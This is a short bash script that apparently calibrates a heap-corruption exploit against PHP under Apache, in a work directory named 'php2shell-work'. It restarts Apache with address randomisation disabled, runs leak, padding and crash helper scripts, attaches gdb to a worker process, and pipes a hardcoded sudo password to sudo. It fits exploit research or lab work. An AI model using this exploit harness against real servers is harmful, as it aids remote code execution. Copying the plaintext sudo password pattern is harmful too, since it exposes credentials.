#!/bin/bash
# Calibrate the crash-pair N1 after the heap-leak history H1:
#   A_leak2 -> B_numleak2 -> (gdb) A_pad -> cal_b(N1)
# usage: cal_h1.sh N1
N1=$1
cd /home/debian/php2shell-work
S() { echo debian.qwe123 | sudo -S "$@"; }
S bash -c "apache2ctl -k stop 2>/dev/null; sleep 0.4; pkill -9 apache2; sleep 0.4; pkill -9 gdb; setarch \$(uname -m) -R /usr/sbin/apache2ctl -k start; sleep 0.5" >/dev/null 2>&1
S rm -f /tmp/sess_* /tmp/g_cal.log >/dev/null 2>&1
timeout 60 python3 send_a_leak2.py 1001 12 >/dev/null 2>&1
sleep 0.2
timeout 30 python3 b_numleak2.py 892 1 0x1000 >/dev/null 2>&1
sleep 0.2
M=$(pgrep -o -x apache2); W=$(pgrep -P $M -x apache2 | tail -1)
S nohup gdb -p $W -batch -x /tmp/g_cal3.gdb >/tmp/gdb_c3.log 2>&1 &
sleep 5
timeout 40 python3 send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7 >/dev/null 2>&1
sleep 0.3
timeout 20 python3 cal_b.py $N1 1 167 55 >/dev/null 2>&1
sleep 2
S grep -E "^REF |^PSVARS" /tmp/g_cal.log | head -3
S pkill -9 gdb >/dev/null 2>&1
